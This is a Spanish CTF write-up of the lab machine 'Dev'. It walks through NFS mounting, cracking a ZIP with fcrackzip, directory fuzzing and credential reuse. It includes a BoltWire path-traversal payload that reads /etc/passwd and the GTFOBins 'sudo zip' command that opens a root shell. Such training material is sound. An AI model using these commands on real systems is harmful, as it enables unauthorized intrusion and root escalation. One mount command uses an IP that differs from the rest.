---
layout: single
title: Máquina Dev
excerpt: "Dev es una máquina CTF que arranca con un escaneo de puertos y un montaje NFS para extraer y descifrar un ZIP protegido con fcrackzip, usa la clave SSH obtenida para acceso inicial, explora la web con ffuf para encontrar y explotar una LFI en BoltWire, se autentica como jeanpaul con credenciales filtradas y, tras comprobar que puede ejecutar zip vía sudo sin contraseña, se abusa de sudo zip vía GTFOBins para escalar a root y capturar la flag."
date: 2025-06-21
classes: wide
header:
  teaser: /assets/images/2025-07-21-Maquina_Dev/dev_portada.png
  teaser_home_page: true
  icon: # /assets/images/Command-And-Control/ciberAttack.jpg
categories:
  - ctf
tags:  
  - nmap
  - mount
  - fcrackzip
  - ssh
  - ffuf
  - BoltWire
  - GTFOBins
---

![](/assets/images/2025-07-21-Maquina_Dev/dev_portada.png)

# IP Academy

https://drive.google.com/drive/folders/1xJy4ozXaahXvjbgTeJVWyY-eUGIKgCj1

- login: root
- password: tcm

```
ip a
```

![](/assets/images/2025-07-21-Maquina_Dev/dev_ip.png)

# nmap

```
nmap -p- -A -T4 192.168.116.134
```

![](/assets/images/2025-07-21-Maquina_Dev/dev_nmap.png)

- Puerto 22 SSH: Casi nunca se encuentra exploit, a menos que se tenga credenciales o algo así.
- Puerto 111 RPC: se tiene RPC, aunque se pueda enumerar no es tan ventajoso.
- Puerto 2049 NFS: (Network File System), es como un SMB para compartir archivos.
- Puerto 8080 HTTP: dice conexión Aparche, Debian y página phpinfo.
- Entonces tener en cuenta los puertos 80, 2049 y 8080.

![](/assets/images/2025-07-21-Maquina_Dev/dev_nmap2.png)

- Buscar en 192.168.116.134 y 192.168.116.134:8080

![](/assets/images/2025-07-21-Maquina_Dev/dev_page80.png)

![](/assets/images/2025-07-21-Maquina_Dev/dev_page8080.png)

- Con nmap se ve que hay NFS (puerto 2049) y se verá si hay algo allí.
- NFS (Network File System) es un protocolo de red que permite a los sistemas operativos compartir archivos y directorios a través de una red.

![](/assets/images/2025-07-21-Maquina_Dev/dev_2049.png)

# mount

`mount` porque en nmap sale abierto el Puerto 2049 NFS. 
El comando **`mount`** en Linux se usa para **“conectar”** un sistema de archivos externo (partición, disco, USB, recurso de red NFS, Samba, etc.) a tu propio árbol de directorios, de modo que puedas leer y escribir en ese dispositivo o carpeta remota como si formara parte de tu sistema local.

```
showmount -e 192.168.116.134
```

- `showmount`: Consulta al servidor NFS en la IP **192.168.116.134** y le pide que muestre sus **exportaciones** (es decir, los directorios que tiene compartidos por NFS).
- `-e`: Pide la lista de carpetas que el servidor ofrece para montar.
- `192.168.116.134`: Dirección del servidor NFS al que consultamos.

- Se observa que hay un recurso compartido de archivo de red NFS del server.
- Ahora vamos a ver como podemos aprovechar de este recurso compartido.

![](/assets/images/2025-07-21-Maquina_Dev/dev_showmount.png)

```
sudo mkdir /mnt/dev
```

- Se necesita crear un directorio para montar todo, en este caso /mnt/dev
- `mnt`: Este directorio por convención está vacío, y tú creas dentro subcarpetas (p. ej. `/mnt/usb`, `/mnt/nfs`, `/mnt/dev`) donde “enchufas” esos recursos con `mount`.

![](/assets/images/2025-07-21-Maquina_Dev/dev_mkdir.png)

```
sudo mount -t nfs 192.168.116.135:/srv/nfs /mnt/dev
```

- `mount`: Para montar (conectar) un sistema de archivos externo en el árbol de directorios local.
- `-t nfs`: Especifica el tipo de sistema de archivos que se va a montar, en este caso, NFS (Network File System).
- `192.168.116.134:/srv/nfs`: Indica el origen remoto: la IP del servidor NFS (`192.168.116.134`) y la ruta exportada (`/srv/nfs`) que quieres montar.
- `/mnt/dev`: Es el punto de montaje local: una carpeta vacía en tu máquina (típicamente dentro de `/mnt` o `/media`) donde aparecerá el contenido de `/srv/nfs`.

![](/assets/images/2025-07-21-Maquina_Dev/dev_mount.png)

```
cd /mnt/dev
ls
```

- Ya montado todo, se puede ver el archivo save.zip montado en el directorio /mnt/dev

![](/assets/images/2025-07-21-Maquina_Dev/dev_mntdev.png)

```
unzip save.zip
```

- Se intenta descomprimir pero necesita una clave

![](/assets/images/2025-07-21-Maquina_Dev/dev_savezip.png)

# fcrackzip

```
sudo apt install fcrackzip
```

- `fcrackzip`: Es una herramienta utilizada para descifrar contraseñas de archivos ZIP protegidos con contraseña. Soporta dos métodos de ataque: fuerza bruta y diccionario.

- Se instala fcrackzip.

![](/assets/images/2025-07-21-Maquina_Dev/dev_install.png)

```
fcrackzip -v -u -D -p /usr/share/worldlists/rockyou.txt save.zip
```

- `fcrackzip`: Para descifrar contraseñas de archivos ZIP.
- `-v`: Activa el modo verboso, lo que significa que se mostrará información adicional sobre el progreso del descifrado.
- `-u`: Indica que cada contraseña debe ser probada como una posible contraseña de descompresión. 
- `-D`: Indica que se va a realizar un ataque de diccionario.
- `-p /usr/share/worldlists/rockyou.txt`: Especifica la ruta al archivo de diccionario que contiene la lista de posibles contraseñas. 
- `save.zip`: Es el archivo ZIP protegido por contraseña que se intenta descifrar.

- Con esto se encuentra la contraseña: java101

![](/assets/images/2025-07-21-Maquina_Dev/dev_fcrackzip.png)

```
sudo unzip save.zip
```

- Ingresamos la clave java101 y se descomprime.

![](/assets/images/2025-07-21-Maquina_Dev/dev_unzip.png)

```
cat todo.txt
```

- Tenemos una firma de JP, capaz sea un usuario.
- Además de tiene un archivo `id_rsa`que se puede usa para conectarse a través de SSH.

![](/assets/images/2025-07-21-Maquina_Dev/dev_cattodo.png)

```
cat id_rsa
```

- El fichero `id_rsa` es, por convención de OpenSSH, tu **clave privada RSA** para autenticarte vía SSH sin necesidad de contraseña.

![](/assets/images/2025-07-21-Maquina_Dev/dev_key.png)
# ssh

```
ssh -i id_rsa jp@192.168.116.134
```

- `ssh`: Para iniciar una conexión SSH.
- `-i id_rsa`: Especifica el archivo de clave privada que se utilizará para la autenticación. En este caso, id_rsa es el archivo de clave privada.
- `jp@192.168.116.134`: Indica el nombre de usuario (jp) y la dirección IP del servidor (192.168.116.134) al que se está intentando conectar.

- Al ejecutar nos pide una contraseña, por mientras se toma nota de "jp" que esta en todo.txt

![](/assets/images/2025-07-21-Maquina_Dev/dev_ssh.png)

# ffuf

```
ffuf -w <worldlist>:FUZZ -u <URL>/FUZZ
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://192.168.116.134/FUZZ
```

- Ahora se buscará directorios y archivos ocultos en un servidor web. 
- Primero solo a la URL: https://192.168.116.134
- Los códigos de estado que empiezan por 300 están relacionados con **redirecciones**.
- **301 Moved Permanently**: la página que estás buscando no está aquí y se ha movido permanentemente a una nueva ubicación.

![](/assets/images/2025-07-21-Maquina_Dev/dev_ffuf.png)

```
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://192.168.116.134:8080/FUZZ
```

- Luego la URL junto con el puerto 8080: https://192.168.116.134:8080
- También hay estado 301 en el resultado de FFUF para la URL con el puerto 8080 http://192.168.116.134:8080

![](/assets/images/2025-07-21-Maquina_Dev/dev_ffuf8080.png)

- Se ingresa a 192.168.116.134/app (porque tiene status 301).
- Cuando te encuentras con un directorio y este listado de directorio, puede ser un gran hallazgo.

![](/assets/images/2025-07-21-Maquina_Dev/dev_indexapp.png)

- Se revisa todo, se ingresa a /app/config ya que puede ser interesante.
- Interesante también el archivo YML de punto de configuración, se descarga config.yml

![](/assets/images/2025-07-21-Maquina_Dev/dev_configyml.png)

- Se abre el archivo config.yml y se toma nota del **username: bolt** y **password: I_love_java**.

![](/assets/images/2025-07-21-Maquina_Dev/dev_ilovejava.png)

- También se ingresa a 192.168.116.134:8080/dev (porque tiene status 301).
- Se observa BoltWire, que es un CMS (Content Management System) es un software (ej. WordPress) que facilita la creación, gestión y publicación como páginas web. Escrito en PHP.

![](/assets/images/2025-07-21-Maquina_Dev/dev_boltwire.png)

# BoltWire 

```
searchsploit boltwire
```

- Se busca alguna vulnerabilidad de BoltWire.
- En este caso no lo haremos así, sino manualmente, igualmente se revisa los exploits.
- No nos servirá Multiple Cross‑Site Scripting (XSS), ya que es para atacar a los usuarios (facilita el robo de sesiones). Es una vulnerabilidad que permite inyectar y ejecutar código JavaScript arbitrario en el navegador de otras víctimas cuando visitan URLs manipuladas.
- Se usará LFI, ya que permite a un atacante forzar al servidor a leer (e incluso ejecutar, si hay extensiones peligrosas) archivos locales del sistema de archivos.

![](/assets/images/2025-07-21-Maquina_Dev/dev_localfile.png)

- Se busca el exploit de BoltWire.
- https://www.exploit-db.com/exploits/48411

![](/assets/images/2025-07-21-Maquina_Dev/dev_exploit.png)

![](/assets/images/2025-07-21-Maquina_Dev/dev_boltwireexploit.png)

- Se acepta esta ruta como entrada, que es un error de codificación en el desarrollo.
- Lo que hace este exploit es buscar archivos locales.

![](/assets/images/2025-07-21-Maquina_Dev/dev_exploitcode.png)

- Asegurarse de haber creado una cuenta en la web, sino el exploit no funcionará. Esta condición también lo dice en su código exploit.

![](/assets/images/2025-07-21-Maquina_Dev/dev_register.png)

- Se hace el registro.

![](/assets/images/2025-07-21-Maquina_Dev/dev_account.png)

- Ahora se modifica la URL con el código del exploit: `.search&action=../../../../../../../etc/passwd`
- Vemos que funciona y nos da una lista de usuarios.

![](/assets/images/2025-07-21-Maquina_Dev/dev_urlexploit.png)

- Se observa el usuario jeanpaul, pero ya se había tomado nota de un supuesto usuario JP, pueden ser los mismos.

![](/assets/images/2025-07-21-Maquina_Dev/dev_jeanpaul.png)

# ssh continuación

```
ssh -i id_rsa jeanpaul@192.168.116.134
```

- Se intenta nuevamente con ssh pero ahora con jeanpaul@192.168.116.134 y no jp@192.168.116.134
- Pero nos pide contraseña.
- Se puede forzar la contraseña pero si es fuerte sería difícil. Pero se tiene las notas que puede servir.

![](/assets/images/2025-07-21-Maquina_Dev/dev_idrsa.png)

- Recordar del archivo todo.txt decía que a JP le gustaba java. A parte se tomo nota de un user y password (`I_love _java`) de config.yml

![](/assets/images/2025-07-21-Maquina_Dev/dev_password.png)

- Probablemente esta contraseña I_love_java sea de Jean Paul
- Y si era la contraseña. Tenemos acceso con el usuario jeanpaul.

![](/assets/images/2025-07-21-Maquina_Dev/dev_sshjeanpaul.png)

```
history
sudo -l
```

- Ya se tiene un usuario de bajo nivel, con `history` podemos ver que comandos se ejecutaron.
- `sudo -l` nos dice que comandos puede ejecutar como sudo sin contraseña.
- Se observa que se puede ejecutar zip sin contraseña.

![](/assets/images/2025-07-21-Maquina_Dev/dev_history.png)

```
sudo zip
```

- Se puede ejecutar zip sin contraseña.
- Ahora la pregunta es como se puede abusar sudo zip para escalar a root, esto aparece mucho en CTF si no tenemos contraseña.

![](/assets/images/2025-07-21-Maquina_Dev/dev_sudozip.png)

# GTFOBins

https://gtfobins.github.io/

- En GTFOBins se puede buscar diferentes tipos de escalaciones.

![](/assets/images/2025-07-21-Maquina_Dev/dev_gtfobins.png)

- Se tiene que buscar un sudo escalation.

![](/assets/images/2025-07-21-Maquina_Dev/dev_sudogtfo.png)

- Se busca zip.

![](/assets/images/2025-07-21-Maquina_Dev/dev_zipsudo.png)

- Se copia estas líneas de código uno por uno.

![](/assets/images/2025-07-21-Maquina_Dev/dev_sudocode.png)

```
TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'sh #'
```

- Si ejecutamos estas 2 líneas, nos arroja una shell.
- Finalmente se obtiene root y la flag.

![](/assets/images/2025-07-21-Maquina_Dev/dev_flag.png)

- *Autor: marcelosec*
